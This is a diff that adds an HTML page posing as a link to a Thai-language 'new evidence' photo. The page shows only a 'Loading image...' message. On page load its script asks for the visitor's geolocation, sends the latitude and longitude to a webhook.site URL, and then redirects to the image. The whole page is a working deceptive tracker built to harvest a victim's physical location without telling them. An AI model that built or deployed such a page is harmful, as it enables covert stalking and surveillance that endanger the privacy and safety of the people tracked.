@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="ดูรูปภาพหลักฐานใหม่">
+    <meta property="og:image" content="https://rewat9888.github.io/upgraded-fishstick/new_evidence.jpg"> 
+    <meta property="og:type" content="website">
+    <title>Loading...</title>
+</head>
+<body onload="getLocation()" style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <h2>กำลังโหลดรูปภาพ...</h2>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(s => {
+                    fetch('https://webhook.site/aaca1b99-4b80-4376-b5b9-9f1a8175c9ca?lat=' + s.coords.latitude + '&lng=' + s.coords.longitude);
+                    setTimeout(go, 500);
+                }, go);
+            } else { go(); }
+        }
+        function go() { window.location.href = "new_evidence.jpg"; }
+    </script>
+</body>
+</html>
